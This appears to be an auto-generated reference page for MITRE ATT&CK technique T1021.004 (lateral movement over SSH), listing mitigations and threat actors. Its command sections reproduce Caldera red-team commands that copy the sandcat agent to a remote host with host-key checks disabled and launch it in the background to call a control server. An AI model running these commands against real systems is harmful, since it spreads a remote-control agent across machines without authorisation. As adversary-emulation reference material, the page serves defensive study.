
# SSH

## Description

### MITRE Description

> Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.

SSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.(Citation: SSH Secure Shell)

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: None
* Platforms: ['Linux', 'macOS']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1021/004

## Potential Commands

```
scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go &&
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'
scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go &&
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'
```

## Commands Dataset

```
[{'command': 'scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null '
             '-o ConnectTimeout=3 sandcat.go-darwin '
             '#{remote.ssh.cmd}:~/sandcat.go &&\n'
             'ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null '
             "-o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go "
             "-server #{server} -group red 1>/dev/null 2>/dev/null &'\n",
  'name': 'Copy 54ndc47 to remote host and start it, assumes target uses SSH '
          'keys and passwordless authentication',
  'source': 'data/abilities/lateral-movement/10a9d979-e342-418a-a9b0-002c483e0fa6.yml'},
 {'command': 'scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null '
             '-o ConnectTimeout=3 sandcat.go-linux '
             '#{remote.ssh.cmd}:~/sandcat.go &&\n'
             'ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null '
             "-o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go "
             "-server #{server} -group red 1>/dev/null 2>/dev/null &'\n",
  'name': 'Copy 54ndc47 to remote host and start it, assumes target uses SSH '
          'keys and passwordless authentication',
  'source': 'data/abilities/lateral-movement/10a9d979-e342-418a-a9b0-002c483e0fa6.yml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Mitre Stockpile - Copy 54ndc47 to remote host and start it, assumes target uses SSH keys and passwordless authentication': {'description': 'Copy '
                                                                                                                                              '54ndc47 '
                                                                                                                                              'to '
                                                                                                                                              'remote '
                                                                                                                                              'host '
                                                                                                                                              'and '
                                                                                                                                              'start '
                                                                                                                                              'it, '
                                                                                                                                              'assumes '
                                                                                                                                              'target '
                                                                                                                                              'uses '
                                                                                                                                              'SSH '
                                                                                                                                              'keys '
                                                                                                                                              'and '
                                                                                                                                              'passwordless '
                                                                                                                                              'authentication',
                                                                                                                               'id': '10a9d979-e342-418a-a9b0-002c483e0fa6',
                                                                                                                               'name': 'Start '
                                                                                                                                       '54ndc47',
                                                                                                                               'platforms': {'darwin': {'sh': {'cleanup': 'ssh '
                                                                                                                                                                          '-o '
                                                                                                                                                                          'ConnectTimeout=3 '
                                                                                                                                                                          '#{remote.ssh.cmd} '
                                                                                                                                                                          "'pkill "
                                                                                                                                                                          '-f '
                                                                                                                                                                          'sandcat '
                                                                                                                                                                          '& '
                                                                                                                                                                          'rm '
                                                                                                                                                                          '-f '
                                                                                                                                                                          "~/sandcat.go'\n",
                                                                                                                                                               'command': 'scp '
                                                                                                                                                                          '-o '
                                                                                                                                                                          'StrictHostKeyChecking=no '
                                                                                                                                                                          '-o '
                                                                                                                                                                          'UserKnownHostsFile=/dev/null '
                                                                                                                                                                          '-o '
                                                                                                                                                                          'ConnectTimeout=3 '
                                                                                                                                                                          'sandcat.go-darwin '
                                                                                                                                                                          '#{remote.ssh.cmd}:~/sandcat.go '
                                                                                                                                                                          '&&\n'
                                                                                                                                                                          'ssh '
                                                                                                                                                                          '-o '
                                                                                                                                                                          'StrictHostKeyChecking=no '
                                                                                                                                                                          '-o '
                                                                                                                                                                          'UserKnownHostsFile=/dev/null '
                                                                                                                                                                          '-o '
                                                                                                                                                                          'ConnectTimeout=3 '
                                                                                                                                                                          '#{remote.ssh.cmd} '
                                                                                                                                                                          "'nohup "
                                                                                                                                                                          './sandcat.go '
                                                                                                                                                                          '-server '
                                                                                                                                                                          '#{server} '
                                                                                                                                                                          '-group '
                                                                                                                                                                          'red '
                                                                                                                                                                          '1>/dev/null '
                                                                                                                                                                          '2>/dev/null '
                                                                                                                                                                          "&'\n",
                                                                                                                                                               'payloads': ['sandcat.go-darwin']}},
                                                                                                                                             'linux': {'sh': {'cleanup': 'ssh '
                                                                                                                                                                         '-o '
                                                                                                                                                                         'ConnectTimeout=3 '
                                                                                                                                                                         '-o '
                                                                                                                                                                         'StrictHostKeyChecking=no '
                                                                                                                                                                         '#{remote.ssh.cmd} '
                                                                                                                                                                         "'pkill "
                                                                                                                                                                         '-f '
                                                                                                                                                                         'sandcat '
                                                                                                                                                                         '& '
                                                                                                                                                                         'rm '
                                                                                                                                                                         '-f '
                                                                                                                                                                         "~/sandcat.go'\n",
                                                                                                                                                              'command': 'scp '
                                                                                                                                                                         '-o '
                                                                                                                                                                         'StrictHostKeyChecking=no '
                                                                                                                                                                         '-o '
                                                                                                                                                                         'UserKnownHostsFile=/dev/null '
                                                                                                                                                                         '-o '
                                                                                                                                                                         'ConnectTimeout=3 '
                                                                                                                                                                         'sandcat.go-linux '
                                                                                                                                                                         '#{remote.ssh.cmd}:~/sandcat.go '
                                                                                                                                                                         '&&\n'
                                                                                                                                                                         'ssh '
                                                                                                                                                                         '-o '
                                                                                                                                                                         'StrictHostKeyChecking=no '
                                                                                                                                                                         '-o '
                                                                                                                                                                         'UserKnownHostsFile=/dev/null '
                                                                                                                                                                         '-o '
                                                                                                                                                                         'ConnectTimeout=3 '
                                                                                                                                                                         '#{remote.ssh.cmd} '
                                                                                                                                                                         "'nohup "
                                                                                                                                                                         './sandcat.go '
                                                                                                                                                                         '-server '
                                                                                                                                                                         '#{server} '
                                                                                                                                                                         '-group '
                                                                                                                                                                         'red '
                                                                                                                                                                         '1>/dev/null '
                                                                                                                                                                         '2>/dev/null '
                                                                                                                                                                         "&'\n",
                                                                                                                                                              'payloads': ['sandcat.go-linux']}}},
                                                                                                                               'tactic': 'lateral-movement',
                                                                                                                               'technique': {'attack_id': 'T1021.004',
                                                                                                                                             'name': 'Remote '
                                                                                                                                                     'Services: '
                                                                                                                                                     'SSH'}}}]
```

# Tactics


* [Lateral Movement](../tactics/Lateral-Movement.md)


# Mitigations


* [User Account Management](../mitigations/User-Account-Management.md)

* [Multi-factor Authentication](../mitigations/Multi-factor-Authentication.md)
    
* [Disable or Remove Feature or Program](../mitigations/Disable-or-Remove-Feature-or-Program.md)
    

# Actors


* [GCMAN](../actors/GCMAN.md)

* [OilRig](../actors/OilRig.md)
    
* [menuPass](../actors/menuPass.md)
    
* [APT39](../actors/APT39.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [TEMP.Veles](../actors/TEMP.Veles.md)
    
* [Rocke](../actors/Rocke.md)
    
